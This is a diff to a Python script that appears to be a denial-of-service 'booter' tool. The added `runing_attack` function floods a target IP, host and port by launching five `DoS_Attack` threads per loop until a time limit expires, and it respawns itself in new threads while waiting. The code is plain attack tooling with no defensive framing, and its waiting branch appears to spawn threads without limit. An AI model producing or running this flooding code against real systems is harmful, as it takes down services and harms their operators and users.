@@ -78,7 +78,23 @@ status_code = False
 id_loader = 0
 def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet):
     global status_code,id_loader
-        
+    if status_code == True:
+        while time.time() < time_loader:
+            for _ in range(spam_loader):
+                id_loader += 1
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
+                th.start()
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
+                th.start()
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
+                th.start()
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
+                th.start()
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
+                th.start()
+    else:
+        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
+
 #DATA
 banner = f"""
 {Fore.WHITE}  ╔═══════════{Fore.GREEN}   ╔══════════{Fore.YELLOW}  ╔══════════╗{Fore.LIGHTBLUE_EX} ╔═════════╗{Fore.RED}╔══╗    ╔══╗
